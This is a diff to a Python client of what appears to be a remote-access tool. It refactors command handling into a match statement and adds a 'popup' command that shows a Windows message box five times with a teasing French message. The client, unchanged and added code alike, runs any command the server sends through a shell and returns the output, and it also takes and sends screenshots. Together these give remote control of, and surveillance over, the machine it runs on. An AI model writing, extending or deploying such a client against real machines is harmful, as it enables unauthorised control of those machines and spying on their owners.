@@ -1,7 +1,7 @@
 """
 Client implementation.
 """
-
+import ctypes
 import socket
 import threading
 import json
@@ -103,21 +103,24 @@ class Client:
     
     def handle_command(self, command):
         """Handle command from server."""
-        if command == "terminal":
-            self.open_terminal()
-        elif command == "screenshot":
-            self.take_screenshot()
-        else:
-            try:
-                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                if os.name == 'nt':
-                    decoded = result.decode('cp850', errors='replace')
-                else:
-                    decoded = result.decode()
-                self.send_message("response", decoded)
-            except subprocess.CalledProcessError as e:
-                self.logger.error("CalledProcessError")
-                self.send_message("response", f"Error: {str(e)}")
+        match command:
+            case "popup":
+                self.open_popup("tqt on est gentil")
+            case "terminal":
+                self.open_terminal()
+            case "screenshot":
+                self.take_screenshot()
+            case _:
+                try:
+                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    if os.name == 'nt':
+                        decoded = result.decode('cp850', errors='replace')
+                    else:
+                        decoded = result.decode()
+                    self.send_message("response", decoded)
+                except subprocess.CalledProcessError as e:
+                    self.logger.error("CalledProcessError")
+                    self.send_message("response", f"Error: {str(e)}")
 
     def open_terminal(self):
         """Open a terminal window."""
@@ -129,6 +132,15 @@ class Client:
             self.send_message("response", "Terminal opened")
         except Exception as e:
             self.send_message("response", f"Error opening terminal: {str(e)}")
+
+    def open_popup(self, message, times=5):
+        """Ouvre une popup native Windows avec un message."""
+        try:
+            for i in range(times):
+                ctypes.windll.user32.MessageBoxW(0, message, "Popup", 0x40)
+            self.send_message("response", "Popup ouverte")
+        except Exception as e:
+            self.send_message("response", f"Erreur ouverture popup: {str(e)}")
     
     def take_screenshot(self):
         """Take a screenshot and send it to the server."""
